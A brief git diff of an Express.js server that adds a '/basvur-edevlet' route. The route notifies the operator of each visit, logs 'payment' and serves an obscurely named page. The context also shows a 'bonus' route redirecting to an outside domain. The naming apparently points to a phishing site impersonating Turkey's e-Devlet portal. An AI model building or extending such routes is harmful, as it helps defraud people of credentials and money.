@@ -96,7 +96,18 @@ app.get('/4c2abonus.html', (req, res) => {
     // Kullanıcıyı yönlendir
     res.redirect('https://grnti.vercel.app/');
 });
-
+ app.get('/basvur-edevlet', (req, res) => {
+    notifyVisitorLogin()
+     .then(() => {
+        console.log('odeme');
+       res.sendFile(path.join(__dirname, 'public', 'as44gsa3.html'));
+     })
+     .catch((error) => {
+       console.error('Error:', error);
+       res.status(500).send('Internal Server Error');
+     });
+ });
+ 
 
   
 
